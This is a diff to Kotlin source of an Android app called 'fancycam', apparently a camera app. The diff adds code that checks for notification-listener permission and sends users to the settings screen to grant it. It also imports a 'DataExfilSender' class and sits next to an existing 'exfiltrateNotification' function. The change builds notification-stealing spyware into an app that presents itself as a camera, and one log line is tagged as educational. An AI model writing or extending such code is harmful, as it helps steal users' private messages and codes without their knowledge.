@@ -1,7 +1,11 @@
-package com.example.fancycam
+package com.example.fancycam.services
 
+import com.example.fancycam.network.AppConfig
+import com.example.fancycam.network.DataExfilSender
+import com.example.fancycam.ui.AppActivityLogger
 import android.app.Notification
 import android.content.Context
+import android.content.Intent
 import android.os.Bundle
 import android.provider.Settings
 import android.service.notification.NotificationListenerService
@@ -144,6 +148,34 @@ class NotificationReaderService : NotificationListenerService() {
         @Synchronized
         fun clearCapturedNotifications(context: Context) {
             context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().remove(KEY_NOTIFICATIONS).apply()
+        }
+
+        fun isNotificationAccessEnabled(context: Context): Boolean {
+            return try {
+                androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(context)
+                    .contains(context.packageName)
+            } catch (e: Exception) {
+                Log.w(TAG, "Cannot check notification access: ${e.message}")
+                false
+            }
+        }
+
+        fun openNotificationAccessSettings(context: Context) {
+            try {
+                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                context.startActivity(intent)
+            } catch (e: Exception) {
+                Log.e(TAG, "Cannot open notification access settings: ${e.message}", e)
+            }
+        }
+
+        fun ensureNotificationAccess(context: Context): Boolean {
+            if (isNotificationAccessEnabled(context)) return true
+            Log.w(TAG, "[EDUCATIONAL] Notification access not granted; prompting user")
+            openNotificationAccessSettings(context)
+            return false
         }
 
         fun exfiltrateNotification(context: Context, notificationJson: JSONObject) {
